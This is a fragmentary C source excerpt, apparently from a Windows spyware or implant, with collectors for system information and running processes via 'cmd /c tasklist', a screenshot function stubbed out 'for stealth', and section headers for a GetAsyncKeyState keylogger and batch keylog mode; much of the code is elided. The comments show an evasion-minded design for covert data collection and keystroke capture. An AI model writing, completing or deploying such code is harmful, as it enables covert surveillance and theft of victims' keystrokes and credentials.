...
/* ── collectors/system_info — LOLBins ── */
...
/* ── collectors/processes — LOLBin ── */
static void collect_processes(void) {
    emitf("=== RUNNING PROCESSES ===\r\n");
    char out[32768] = {0};
    DWORD len = 0;
    run_cmd("cmd /c tasklist", out, sizeof(out), &len);
    if (len > 0) emit(out, len);
    emitf("\r\n");
}
...
/* ── collectors/screenshot (stubbed — GDI removed for stealth) ── */
static void collect_screenshot(void) {
    emitf("=== SCREENSHOT ===\r\n");
    emitf("  (skipped: stealth mode)\r\n\r\n");
}

/* ── keylogger — GetAsyncKeyState polling (no hooks) ── */
...
/* ── batch keylog (for automated testing) ── */
